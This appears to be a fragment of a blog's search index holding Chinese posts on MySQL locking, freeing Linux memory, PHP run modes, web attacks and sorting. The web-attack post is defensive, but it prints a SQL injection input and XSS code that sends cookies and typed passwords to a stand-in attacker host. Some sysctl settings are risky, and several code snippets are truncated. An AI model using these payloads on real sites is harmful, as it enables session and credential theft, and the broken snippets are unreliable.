–low-priority-updates 。这就会让更新操作的优先级低于 SELECT 。 这种情况下，在上面的假设中，第二个 SELECT 就会在 INSERT 之前执行了，而且也无需等待第一个 SELECT 了。 3 ）可以执行 SET LOW_PRIORITY_UPDATES=1 命令，指定所有的更新操作都放到一个指定的链接中去完成。 4 ）用 LOW_PRIORITY 属性来降低 INSERT ， UPDATE ， DELETE 的优先级。 5 ）用 HIGH_PRIORITY 来提高 SELECT 语句的优先级。 6 ）从 MySQL 3.23.7 开始，可以在启动 mysqld 时指定系统变量 max_write_lock_count 为一个比较低的值，它能强制临时地提高表的插入数达到一个特定值后的所有 SELECT 操作的优先级。它允许在 WRITE 锁达到一定数量后有 READ 锁。 7 ）当 INSERT 和 SELECT 一起使用出现问题时，可以转而采用 MyISAM 表，它支持并发的 SELECT 和 INSERT 操作。 8 ）当在同一个表上同时有插入和删除操作时， INSERT DELAYED 可能会很有用。 9 ）当 SELECT 和 DELETE 一起使用出现问题时， DELETE 的 LIMIT 参数可能会很有用。 10 ）执行 SELECT 时使用 SQL_BUFFER_RESULT 有助于减短锁表的持续时间。 11 ）可以修改源代码 `mysys/thr_lock.c’ ，只用一个所队列。这种情况下，写锁和读锁的优先级就一样了，这对一些应用可能有帮助。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[linux释放内存]]></title>
      <url>%2F2016%2F09%2F16%2Flinux%E9%87%8A%E6%94%BE%E5%86%85%E5%AD%98%2F</url>
      <content type="text"><![CDATA[在应用mongodb时，发现服务器内存会暴涨，free几乎没有，还有就是程序如果大量对文件进行操作就会有这种现象，但一般来说都会自动回收的，但有时我们还是需要手动清理来应急。&nbsp; （1）缓存机制 为了提高文件系统性能，内核利用一部分物理内存分配出缓冲区，用于缓存系统操作和数据文件，当内核收到读写的请求时，内核先去缓存区找是否有请求的数据，有就直接返回，如果没有则通过驱动程序直接操作磁盘。 缓存机制优点：减少系统调用次数，降低CPU上下文切换和磁盘访问频率。 CPU上下文切换：CPU给每个进程一定的服务时间，当时间片用完后，内核从正在运行的进程中收回处理器，同时把进程当前运行状态保存下来，然后加载下一个任务，这个过程叫做上下文切换。实质上就是被终止运行进程与待运行进程的进程切换。 （2）查看缓存区及内存使用情况 [root@localhost ~]# free -m total used free shared buffers cached Mem: 7866 7725 141 19 74 6897 -/+ buffers/cache: 752 7113 Swap: 16382 32 16350free -h 也是可以的单位为G 可以看到内存总共8G，已使用7725M，剩余141M，不少的人都是这么看的，这样并不能作为实际的使用率。因为有了缓存机制，具体该怎么算呢？空闲内存=free（141）+buffers（74）+cached（6897）已用内存=total（7866）-空闲内存由此算出空闲内存是7112M，已用内存754M，这才是真正的使用率，也可参考-/+ buffers/cache这行信息也是内存正确使用率。 （3）可见缓存区分为buffers和cached，他们有什么区别呢？ 内核在保证系统能正常使用物理内存和数据量读写情况下来分配缓冲区大小。buffers用来缓存metadata及pages，可以理解为系统缓存，例如，vi打开一个文件。cached是用来给文件做缓存，可以理解为数据块缓存，例如，dd if=/dev/zero of=/tmp/test count=1 bs=1G 测试写入一个文件，就会被缓存到缓冲区中，当下一次再执行这个测试命令时，写入速度会明显很快。 （4）随便说下Swap做什么用的呢？ Swap意思是交换分区，通常我们说的虚拟内存，是从硬盘中划分出的一个分区。当物理内存不够用的时候，内核就会释放缓存区（buffers/cache）里一些长时间不用的程序，然后将这些程序临时放到Swap中，也就是说如果物理内存和缓存区内存不够用的时候，才会用到Swap。 swap清理：swapoff -a &amp;&amp; swapon -a注意：这样清理有个前提条件，空闲的内存必须比已经使用的swap空间大 （5）怎样释放缓存区内存呢？ a)直接改变内核运行参数 #释放pagecacheecho 1 &gt;/proc/sys/vm/drop_caches #释放dentries和inodesecho 2 &gt;/proc/sys/vm/drop_caches #释放pagecache、dentries和inodesecho 3 &gt;/proc/sys/vm/drop_caches b)也可以使用sysctl重置内核运行参数 sysctl -w vm.drop_caches=3&nbsp; &nbsp; 注意：这两个方式都是临时生效，永久生效需添加sysctl.conf文件中，一般写成脚本手动清理，建议不要清理。修改/etc/sysctl.conf 添加如下选项后就不会内存持续增加 vm.dirty_ratio = 1vm.dirty_background_ratio=1vm.dirty_writeback_centisecs=2vm.dirty_expire_centisecs=3vm.drop_caches=3vm.swappiness =100vm.vfs_cache_pressure=163vm.overcommit_memory=2vm.lowmem_reserve_ratio=32 32 8kern.maxvnodes=3&nbsp; 上面的设置比较粗暴，使cache的作用基本无法发挥。需要根据机器的状况进行适当的调节寻找最佳的折衷。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PHP之运行模式]]></title>
      <url>%2F2016%2F08%2F23%2Fphp%E4%B9%8B%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F%2F</url>
      <content type="text"><![CDATA[最近接触的服务器都是nginx，不是原来的apache，所以对于PHP的执行开始纠结起来，因为调用扩展的方式不一样， 故此引出PHP的运行模式这一话题。 首先概括下 PHP运行模式有4钟： 1）cgi 通用网关接口（Common Gateway Interface)2） fast-cgi 常驻 (long-live) 型的 CGI3） cli 命令行运行 （Command Line Interface）4）web模块模式 （apache等web服务器运行的模块模式） 目前在HTTPServer这块基本可以看到有三种stack比较流行：（1）Apache+mod_php5（2）lighttp+spawn-fcgi（3）nginx+PHP-FPM三者后两者性能可能稍优，但是Apache由于有丰富的模块和功能，目前来说仍旧是老大。有人测试nginx+PHP-FPM在高并发情况下可能会达到Apache+mod_php5的5~10倍，现在nginx+PHP-FPM使用的人越来越多。 然后我们来一次介绍巴拉巴拉。。 &nbsp; 1.CGI（Common Gateway Interface） CGI即通用网关接口(Common Gateway Interface)，它是一段程序, 通俗的讲CGI就象是一座桥，把网页和WEB服务器中的执行程序连接起来，它把HTML接收的指令传递给服务器的执行程序，再把服务器执行程序的结果返还给HTML页。CGI 的跨平台性能极佳，几乎可以在任何操作系统上实现。 CGI已经是比较老的模式了，这几年都很少用了。每有一个用户请求，都会先要创建cgi的子进程，然后处理请求，处理完后结束这个子进程，这就是fork-and-execute模式。 当用户请求数量非常多时，会大量挤占系统的资源如内存，CPU时间等，造成效能低下。所以用cgi方式的服务器有多少连接请求就会有多少cgi子进程，子进程反复加载是cgi性能低下的主要原因。 如果不想把 PHP 嵌入到服务器端软件（如 Apache）作为一个模块安装的话，可以选择以 CGI 的模式安装。或者把 PHP 用于不同的 CGI 封装以便为代码创建安全的 chroot 和 setuid 环境。这样每个客户机请求一个php文件，Web服务器就调用php.exe（win下是php.exe,linux是php）去解释这个文件，然后再把解释的结果以网页的形式返回给客户机。 这种安装方式通常会把 PHP 的可执行文件安装到 web 服务器的 cgi-bin 目录。CERT 建议书 CA-96.11 建议不要把任何的解释器放到 cgi-bin 目录。这种方式的好处是把web server和具体的程序处理独立开来，结构清晰，可控性强，同时缺点就是如果在高访问需求的情况下，cgi的进程fork就会成为很大的服务器负担，想 象一下数百个并发请求导致服务器fork出数百个进程就明白了。这也是为什么cgi一直背负性能低下，高资源消耗的恶名的原因。&nbsp; CGI模式安装： CGI已经是比较老的模式了，这几年都很少用了,所以我们只是为了测试。安装CGI模式需要注释掉LoadModule php5_module modules/libphp5.so 这行。如果不注释这行会一直走到handler模式。也就是模块模式。然后在httpd.conf增加action：Action application/x-httpd-php /cgi-bin/如果在/cgi-bin/目录找不到php-cgi.可自行从php的bin里面cp一个。然后重启apache,再打开测试页面发现Server API变成：CGI/FastCGI。说明成功切换为cgi模式。问题： 1) 如果cgi程序放在/usr/local/httpd/cgi-bin/里无法执行，遇到403或500错误的话打开apache错误日志 有如下提示： Permission denied: exec of可以检查cgi程序的属性，按Linux contexts文件 里定义的，/usr/local/httpd/cgi-bin/里必须是httpd_sys_script_exec_t 属性。 通过ls -Z查看，如果不是则通过如下命令更改： chcon -t httpd_sys_script_exec_t /var/www/cgi-bin/*.cgi 如果是虚拟主机里的cgi，则参考问题2使之能正常使用普通的功能后，再通过chcon设置cgi文件的context为httpd_sys_script_exec_t即可。chcon -R -t httpd_sys_script_exec_t cgi-bin/2) apache错误提示：…. malformed header from script. Bad header=根据提示说明有header有问题，查看文件输出的第一句话是什么，应该类似于如下Content-type: text/plain; charset=iso-8859-1\n\n或者Content-type:text/html\n\n注意：声明好Content-type后要输出两个空行。3）apache错误提示： Exec format error脚本解释器设置错误。脚本第一行应该以’#!解释器路径’的形式, 填写脚本解释器的路径，如果是PERL程序，常见的路径为: #!/usr/bin/perl 或 #!/usr/local/bin/perl 如果是PHP程序，不需要填写解释器路径，系统会自动找到PHP。 2. Fastcgi模式 fast-cgi 是cgi的升级版本，FastCGI 像是一个常驻 (long-live) 型的 CGI，它可以一直执行着，只要激活后，不会每次都要花费时间去 fork 一次 (这是 CGI 最为人诟病的 fork-and-execute 模式)。FastCGI的工作原理是：(1)、Web Server启动时载入FastCGI进程管理器【PHP的FastCGI进程管理器是PHP-FPM(php-FastCGI Process Manager)】（IIS ISAPI或Apache Module);(2)、FastCGI进程管理器自身初始化，启动多个CGI解释器进程 (在任务管理器中可见多个php-cgi.exe)并等待来自Web Server的连接。(3)、当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。(4)、FastCGI子进程完成处理后将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待并处理来自FastCGI进程管理器（运行在 WebServer中）的下一个连接。在正常的CGI模式中，php-cgi.exe在此便退出了。在CGI模式中，你可以想象 CGI通常有多慢。每一个Web请求PHP都必须重新解析php.ini、重新载入全部dll扩展并重初始化全部数据结构。使用FastCGI，所有这些都只在进程启动时发生一次。一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。Fastcgi的优点： 1）从稳定性上看, fastcgi是以独立的进程池运行来cgi,单独一个进程死掉,系统可以很轻易的丢弃,然后重新分 配新的进程来运行逻辑.2）从安全性上看,Fastcgi支持分布式运算. fastcgi和宿主的server完全独立, fastcgi怎么down也不会把server搞垮.3）从性能上看, fastcgi把动态逻辑的处理从server中分离出来, 大负荷的IO处理还是留给宿主server, 这样宿主server可以一心一意作IO,对于一个普通的动态网页来说, 逻辑处理可能只有一小部分, 大量的图片等静态FastCGI缺点：说完了好处，也来说说缺点。从我的实际使用来看，用FastCGI模式更适合生产环境的服务器。但对于开发用机器来说就不太合适。因为当使用 Zend Studio调试程序时，由于 FastCGI会认为 PHP进程超时，从而在页面返回 500错误。这一点让人非常恼火，所以我在开发机器上还是换回了 ISAPI模式。安装fastcgi模式： 安装apache路径是/usr/local/httpd/安装php路径是/usr/local/php/ 1）安装mod_fastcgi ** **wget http://www.fastcgi.com/dist/mod_fastcgi-2.4.6.tar.gz tar zxvf mod_fastcgi-2.4.6.tar.gz cd mod_fastcgi-2.4.6 cp Makefile.AP2 Makefile vi Makefile， top_dir = /usr/local/httpd make make install 安装完后， /usr/local/httpd/modules/多出一个文件：mod_fcgid.so2）重新编译php** **./configure –prefix=/usr/local/php –enable-fastcgi –enable-force-cgi-redirect –disable-cli make make install这样编译后，在PHP的bin目录下的php-cgi就是fastcgi模式的php解释器了安装成功后,执行php -vPHP 5.3.2 (cgi-fcgi).这里输出带了cgi-fcgi注意： 1.编译参数不能加 –with-apxs=/usr/local/httpd/bin/apxs 否则安装出来的php执行文件是cli模式的2 如果编译时不加–disable-cli则输出 PHP 5.3.2(cli) 3)配置apache需要配置apache来以fastcgi模式运行php程序vi httpd.conf我们使用虚拟机的方式实现： 复制代码代码如下: #加载fastcgi模块 LoadModule fastcgi_module modules/mod_fastcgi.so #//以静态方式执行fastcgi 启动了10进程FastCgiServer /usr/local/php/bin/php-cgi -processes 10 -idle-timeout 150 -pass-header HTTP_AUTHORIZATION &lt;VirtualHost *:80&gt;#DocumentRoot /usr/local/httpd/fcgi-binServerName www.fastcgitest.com`` ScriptAlias /fcgi-bin/ /usr/local/php/bin/ #定义目录映射 /fcgi-bin/ 代替 /usr/local/php/bin/Options +ExecCGIAddHandler fastcgi-script .php .fcgi #.php结尾的请求都要用php-fastcgi来处理AddType application/x-httpd-php .php #增加MIME类型Action application/x-httpd-php /fcgi-bin/php-cgi #设置php-fastcgi的处理器： /usr/local/php/bin/php-cgi&lt;Directory /usr/local/httpd/fcgi-bin/&gt;Options Indexes ExecCGIOrder allow,denyallow from all&lt;/Directory&gt;&lt;/VirtualHost&gt;&nbsp; 4）.restart 下apache,查看phpinfo，如果服务器信息是：Apache/2.2.11 (Unix) mod_fastcgi/2.4.6之类的就说明安装成功了。如果出现403的错误，查看下/usr/local/httpd/fcgi-bin/是否有足够的权限。或者 复制代码代码如下: &lt;Directory /&gt;Options FollowSymLinksAllowOverride NoneOrder deny,allowDeny from all&lt;/Directory&gt;改为： 复制代码代码如下: &lt;Directory /&gt;Options FollowSymLinksAllowOverride NoneOrder allow,denyAllow from all&lt;/Directory&gt;就可以了。ps -ef|grep php-cgi可以看见10个fastcgi进程在跑。 3. CLI模式 CLI是php的命令行运行模式，大家经常会使用它，但是可能并没有注意到（例如：我们在linux下经常使用 “php -m”查找PHP安装了那些扩展就是PHP命令行运行模式；有兴趣的同学可以输入php -h去深入研究该运行模式）1.让 PHP 运行指定文件。php script.phpphp -f script.php以上两种方法（使用或不使用 -f 参数）都能够运行脚本的script.php。您可以选择任何文件来运行，您指定的 PHP 脚本并非必须要以 .php 为扩展名，它们可以有任意的文件名和扩展名。2.在命令行直接运行 PHP 代码。php -r “print_r(get_defined_constants());”在使用这种方法时，请您注意外壳变量的替代及引号的使用。注: 请仔细阅读以上范例，在运行代码时没有开始和结束的标记符！加上 -r 参数后，这些标记符是不需要的，加上它们会导致语法错误。3.通过标准输入（stdin）提供需要运行的 PHP 代码。以上用法给我们提供了非常强大的功能，使得我们可以如下范例所示，动态地生成 PHP 代码并通过命令行运行这些代码：$ some_application | some_filter | php | sort -u &gt;final_output.txt 4. 模块模式 模块模式是以mod_php5模块的形式集成，此时mod_php5模块的作用是接收Apache传递过来的PHP文件请求，并处理这些请求，然后将处理后的结果返回给Apache。如果我们在Apache启动前在其配置文件中配置好了PHP模块（mod_php5）， PHP模块通过注册apache2的ap_hook_post_config挂钩，在Apache启动的时候启动此模块以接受PHP文件的请求。 除了这种启动时的加载方式，Apache的模块可以在运行的时候动态装载，这意味着对服务器可以进行功能扩展而不需要重新对源代码进行编译，甚至根本不需要停止服务器。我们所需要做的仅仅是给服务器发送信号HUP或者AP_SIG_GRACEFUL通知服务器重新载入模块。但是在动态加载之前，我们需要将模块编译成为动态链接库。此时的动态加载就是加载动态链接库。 Apache中对动态链接库的处理是通过模块mod_so来完成的，因此mod_so模块不能被动态加载，它只能被静态编译进Apache的核心。这意味着它是随着Apache一起启动的。Apache是如何加载模块的呢？我们以前面提到的mod_php5模块为例。首先我们需要在Apache的配置文件httpd.conf中添加一行：该运行模式是我们以前在windows环境下使用apache服务器经常使用的，而在模块化(DLL)中，PHP是与Web服务器一起启动并运行的。（是apache在CGI的基础上进行的一种扩展，加快PHP的运行效率） 代码如下: LoadModule php5_module modules/mod_php5.so这里我们使用了LoadModule命令，该命令的第一个参数是模块的名称，名称可以在模块实现的源码中找到。第二个选项是该模块所处的路径。如果需要在服务器运行时加载模块，可以通过发送信号HUP或者AP_SIG_GRACEFUL给服务器，一旦接受到该信号，Apache将重新装载模块，而不需要重新启动服务器。5.php在Nginx中运行模式（Nginx+ PHP-FPM） 使用FastCGI方式现在常见的有两种stack：ligthttpd+spawn-fcgi;另外一种是nginx+PHP-FPM(也可以用spawn-fcgi)。A、如上面所说该两种结构都采用FastCGI对PHP支持，因此HTTPServer完全解放出来，可以更好地进行响应和并发处理。因此lighttpd和nginx都有small, but powerful和efficient的美誉。B、该两者还可以分出一个好坏来，spawn-fcgi由于是lighttpd的一部分，因此安装了lighttpd一般就会使用spawn-fcgi对php支持，但是目前有用户说ligttpd的spwan-fcgi在高并发访问的时候，会出现上面说的内存泄漏甚至自动重启fastcgi。即：PHP脚本处理器当机，这个时候如果用户访问的话，可能就会出现白页(即PHP不能被解析或者出错)。 另一个：首先nginx不像lighttpd本身含带了fastcgi(spawn-fcgi)，因此它完全是轻量级的，必须借助第三方的FastCGI处理器才可以对PHP进行解析，因此其实这样看来nginx是非常灵活的，它可以和任何第三方提供解析的处理器实现连接从而实现对PHP的解析(在nginx.conf中很容易设置)。nginx可以使用spwan-fcgi(需要一同安装lighttpd，但是需要为nginx避开端口，一些较早的blog有这方面安装的教程)，但是由于spawn-fcgi具有上面所述的用户逐渐发现的缺陷，现在慢慢减少使用nginx+spawn-fcgi组合了。 C、由于spawn-fcgi的缺陷，现在出现了新的第三方(目前还是，听说正在努力不久将来加入到PHP core中)的PHP的FastCGI处理器，叫做PHP-FPM(具体可以google)。它和spawn-fcgi比较起来有如下优点：由于它是作为PHP的patch补丁来开发的，安装的时候需要和php源码一起编译，也就是说编译到php core中了，因此在性能方面要优秀一些；同时它在处理高并发方面也优于spawn-fcgi，至少不会自动重启fastcgi处理器。具体采用的算法和设计可以google了解。 因此，如上所说由于nginx的轻量和灵活性，因此目前性能优越，越来越多人逐渐使用这个组合：nginx+PHP/PHP-FPM]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Web攻防之XSS,CSRF,SQL注入]]></title>
      <url>%2F2016%2F05%2F15%2Fweb%E6%94%BB%E9%98%B2%E4%B9%8Bxsscsrfsql%E6%B3%A8%E5%85%A5%2F</url>
      <content type="text"><![CDATA[摘要：对Web服务器的攻击也可以说是形形色色、种类繁多，常见的有挂马、SQL注入、缓冲区溢出、嗅探、利用IIS等针对Webserver漏洞进行攻击。本文结合WEB TOP10漏洞中常见的SQL注入，跨站脚本攻击(XSS)，跨站请求伪造（CSRF）攻击的产生原理，介绍相应的防范方法。1.SQL注入所谓SQL注入式攻击，就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。 攻击者通过在应用程序预先定义好的SQL语句结尾加上额外的SQL语句元素，欺骗数据库服务器执行非授权的查询,篡改命令。 它能够轻易的绕过防火墙直接访问数据库，甚至能够获得数据库所在的服务器的系统权限。在Web应用漏洞中，SQL Injection 漏洞的风险要高过其他所有的漏洞。 攻击原理 &nbsp; 假设的登录查询 SELECT * FROM users WHERE login = ‘victor’ AND password = ‘123 Sever端代码 String sql = “SELECT * FROM users WHERE login = ‘“ + formusr + “‘ AND password = ‘“ + formpwd + “‘“; 输入字符 formusr = ‘ or 1=1 formpwd = anything 实际的查询代码 SELECT * FROM users WHERE username = ‘ ‘ or 1=1 AND password = ‘anything’发现注入点简单办法 1.寻找带有查询字符串的url的网页(例如，查询那些在URL里带有”id=” 的URL)。 2.向这个网站发送一个请求，改变其中的id=语句，带一个额外的单引号（例如：id=123’）。 3.查看返回的内容，在其中查找“sql”，“statement”等关键字（这也说明返回了具体的错误信息，这本身就很糟糕）。如下图： 4.错误消息是否表示发送到SQL服务器的参数没有被正确编码果如此，那么表示可对该网站进行SQL注入攻击。 如何防范SQL注入攻击 一个常见的错误是，假如你使用了存储过程或ORM，你就完全不受SQL注入攻击之害了。这是不正确的，你还是需要确定在给存储过程传递数据时你很谨慎，或在用ORM来定制一个查询时，你的做法是安全的。 参数化查询已被视为最有效的可防御SQL注入攻击的防御方式。目前主流的ORM 框架都内置支持并且推荐使用这种方式进行持久层封装。 所谓的参数化查询（Parameterized Query 或 Parameterized Statement）是指在设计与数据库链接并访问数据时，在需要填入数值或数据的地方，使用参数 (Parameter) 来给值。 例：SELECT * FROM myTable WHERE myID = @myID INSERT INTO myTable (c1, c2, c3, c4) VALUES (@c1, @c2, @c3, @c4)或者INSERT INTO myTable (c1, c2, c3, c4) VALUES(?,?,?,?)通过(?)指定占位符，当然在添加参数的时候，必须按照(c1, c2, c3, c4)的顺序来添加，否则会出错。2.跨站脚本攻击(XSS)XSS 全称(Cross Site Scripting) 跨站脚本攻击， 是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的. 比如获取用户的Cookie，导航到恶意网站,携带木马等。 攻击原理 假如页面有如下一个输入框 【沙发】是来自用户的输入，如果用户输入的是”onfocus=”alert(document.cookie) 那么就会变成 事件被触发的时候嵌入的JavaScript代码将会被执行 攻击的威力，取决于用户输入了什么样的脚本。XSS分类 1. 反射型XSS 反射型XSS，又称非持久型XSS。之所以称为反射型XSS，则是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的。而称为非持久型XSS，则是因为这种攻击方式具有一次性。攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，从而在该浏览器上执行了这段脚本。 比如攻击者将如下链接发送给受害者： http://www.targetserver.com/search.asp?input=alert(document.cookie);当受害者点击这个链接的时候，注入的脚本被当作搜索的关键词发送到目标服务器的search.asp页面中，则在搜索结果的返回页面中，这段脚本将被当作搜索的关键词而嵌入。这样，当用户得到搜索结果页面后，这段脚本也得到了执行。这就是反射型XSS攻击的原理，可以看到，攻击者巧妙地通过反射型XSS的攻击方式，达到了在受害者的浏览器上执行脚本的目的。由于代码注入的是一个动态产生的页面而不是永久的页面，因此这种攻击方式只在点击链接的时候才产生作用，这也是它被称为非持久型XSS的原因 2.存储型XSS 存储型XSS，又称持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器的数据库和文件中。这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。 Xss危害 1.盗取cookie 通过XSS攻击，由于注入代码是在受害者的浏览器上执行，因此能够很方便地窃取到受害者的Cookie信息。比如，我们只要注入类似如下的代码： location.replace(“http://www.attackpage.com/record.asp?secret=&quot;+document.cookie)当受害者的浏览器执行这段脚本的时候，就会自动访问攻击者建立的网站www.attackpage.com，打开其中的recourd.asp，将受害者浏览器的Cookie信息给记录下来。这样，攻击者就得到了用户的Cookie信息。 得到受害者的Cookie信息后，攻击者可以很方便地冒充受害者，从而拥有其在目标服务器上的所有权限，相当于受害者的身份认证被窃取了。 2.钓鱼攻击 所谓钓鱼攻击就是构建一个钓鱼页面，诱骗受害者在其中输入一些敏感信息，然后将其发送给攻击者。利用XSS的注入脚本，我们也可以很方便地注入钓鱼页面的代码，从而引导钓鱼攻击。比如下面这样一段代码： function hack(){ location.replace(“http://www.attackpage.com/record.asp?username=&quot;+document.forms[0].user.value + “password=” + document.forms[0].pass.value); } 此功能需要登录: 请输入用户名： 请输入密码： 注入上面的代码后，则会在原来的页面上，插入一段表单，要求用户输入自己的用户名和密码，而当用户点击“登录”按钮后，则会执行hack()函数，将用户的输入发送到攻击者指定的网站上去。这样，攻击者就成功窃取了该用户的账号信息。和一般的钓鱼攻击不同，XSS引导的钓鱼攻击由于是对用户信任的网站页面进行修改的。 3. CSRF攻击 比如我们注入如下的HTML代码： 假如上面的代码中所访问的是某个银行网站的转账服务，则当受害者的浏览器运行这段脚本时，就会向攻击者指定的账户（示例的123456）执行转账操作。由于这个转账请求是在受害者的浏览器中运行的，因此浏览器也会自动将受害者的Cookie信息一并发送。这样，发送的请求就好像是受害者自己发送的一样，银行网站也将认可这个请求的合法性，攻击者也就达到了伪造请求的目的。 4.传播恶意软件 除了直接注入恶意脚本以外，通过XSS攻击，攻击者也可以很方便地在脚本中引入一些恶意软件，比如病毒、木马、蠕虫等等。例如，攻击者可以在某个自己建立的页面上放置一些恶意软件，然后用XSS注入的方式，插入一段引用该页面的脚本。这样当受害者的浏览器执行这段脚本的时候，就会自动访问放置了恶意软件的页面，从而受到这些恶意软件的感染。 XSS的预防 1. 输入过滤 对用户的所有输入数据进行检测，比如过滤其中的“&lt;”、“&gt;”、“/”等可能导致脚本注入的特殊字符，或者过滤“script”、“javascript”等脚本关键字，或者对输入数据的长度进行限制等等。同时，我们也要考虑用户可能绕开ASCII码，使用十六进制编码来输入脚本。因此，对用户输入的十六进制编码，我们也要进行相应的过滤。只要能够严格检测每一处交互点，保证对所有用户可能的输入都进行检测和XSS过滤，就能够有效地阻止XSS攻击。 2. 输出编码 通过前面对XSS攻击的分析，我们可以看到，之所以会产生XSS攻击，就是因为Web应用程序将用户的输入直接嵌入到某个页面当中，作为该页面的HTML代码的一部分。因此，当Web应用程序将用户的输入数据输出到目标页面中时，只要用HtmlEncoder等工具先对这些数据进行编码，然后再输出到目标页面中。这样，如果用户输入一些HTML的脚本，也会被当成普通的文字，而不会成为目标页面HTML代码的一部分得到执行。 3. Cookie防盗 利用XSS攻击，攻击者可以很方便地窃取到合法用户的Cookie信息。因此，对于Cookie，我们可以采取以下的措施。首先，我们要尽可能地避免在Cookie中泄露隐私，如用户名、密码等；其次，我们可以将Cookie信息利用MD5等Hash算法进行多次散列后存放；再次，为了防止重放攻击，我们也可以将Cookie和IP进行绑定，这样也可以阻止攻击者冒充正常用户的身份。 作为一名普通的网络用户，在XSS攻击的预防上我们可以采取以下措施。首先，我们不要轻易相信电子邮件或者网页中的不明链接，这些链接很有可能引导反射型XSS攻击或者使我们访问到一些不安全的网页。其次，我们在不必要的时候可以禁用脚本功能，这样XSS注入的脚本就无法得到运行。 3. CSRF 攻击CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。 你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。 CSRF漏洞现状 CSRF这种攻击方式在2000年已经被国外的安全人员提出，但在国内，直到06年才开始被关注，08年，国内外的多个大型社区和交互网站分别爆出CSRF漏洞，如：NYTimes.com（纽约时报）、Metafilter（一个大型BLOG网站），YouTube和百度HI……而现在，互联网上的许多站点仍对此毫无防备，以至于安全业界称CSRF为“沉睡的巨人”。 原理 网站A ：为恶意网站。 网站B ：用户已登录的网站。 当用户访问 A站 时，A站 私自访问 B站 的操作链接，模拟用户操作。 假设B站有一个删除评论的链接：http://b.com/comment/?type=delete&amp;id=81723 A站 直接访问该链接，就能删除用户在 B站 的评论。 CSRF 防御技巧 1.验证码 几乎所有人都知道验证码，但验证码不单单用来防止注册机的暴力破解，还可以有效防止CSRF的攻击。验证码算是对抗CSRF攻击最简洁有效的方法。但使用验证码的问题在于，不可能在用户的所有操作上都需要输入验证码.只有一些关键的操作，才能要求输入验证码。不过随着HTML5的发展。利用canvas标签，前端也能识别验证码的字符，让CSRF生效。 2.Token CSRF能攻击成功，根本原因是：操作所带的参数均被攻击者猜测到。既然知道根本原因，我们就对症下药，利用Token。当向服务器传参数时，带上Token。这个Token是一个随机值，并且由服务器和用户同时持有。当用户提交表单时带上Token值，服务器就能验证表单和session中的Token是否一致。 token生成示例代码如下 &nbsp; private static SecureRandom secureRandom=null;public static String createToken() {if(secureRandom==null){String entoropy=”LogonSessionEntoropy” + System.currentTimeMillis();try {secureRandom = SecureRandom.getInstance(“SHA1PRNG”);} catch (NoSuchAlgorithmException e) {throw new RuntimeException(e);}secureRandom.setSeed(entoropy.getBytes());}byte bytes[]=new byte[16];secureRandom.nextBytes(bytes);byte[] base64Bytes = Base64.encode(bytes);return new String(base64Bytes);}&nbsp;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据结构之四种基本排序]]></title>
      <url>%2F2016%2F01%2F15%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E5%9B%9B%E7%A7%8D%E5%9F%BA%E6%9C%AC%E6%8E%92%E5%BA%8F%2F</url>
      <content type="text"><![CDATA[算法是程序的核心，算法的好坏决定了程序的质量。排序算法是程序开发的基本知识。这里介绍冒泡排序，插入排序，选择排序，快速排序四种基本算法，分析一下算法的思路。 前提：分别用冒泡排序法，快速排序法，选择排序法，插入排序法将下面数组中的值按照从小到大的顺序进行排序。$arr(1,43,54,62,21,66,32,78,36,76,39); 1. 冒泡排序思路分析：在要排序的一组数中，对当前还未排好的序列，从前往后对相邻的两个数依次进行比较和调整，让较大的数往下沉，较小的往上冒。即，每当两相邻的数比较后发现它们的排序与排序要求相反时，就将它们互换。 $arr=array(1,43,54,62,21,66,32,78,36,76,39); function bubbleSort($arr) { $len=count($arr); //该层循环控制 需要冒泡的轮数 for($i=1;$i$arr[$k+1]) { $tmp=$arr[$k+1]; $arr[$k+1]=$arr[$k]; $arr[$k]=$tmp; } } } return $arr; } 2. 选择排序思路分析：在要排序的一组数中，选出最小的一个数与第一个位置的数交换。然后在剩下的数当中再找最小的与第二个位置的数交换，如此循环到倒数第二个数和最后一个数比较为止。 function selectSort($arr) { //双重循环完成，外层控制轮数，内层控制比较次数 $len=count($arr); for($i=0; $i]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[bootstrap modal 弹窗 数据清除]]></title>
      <url>%2F2015%2F09%2F13%2Fbootstrap-modal-%E5%BC%B9%E7%AA%97-%E6%95%B0%E6%8D%AE%E6%B8%85%E9%99%A4%2F</url>
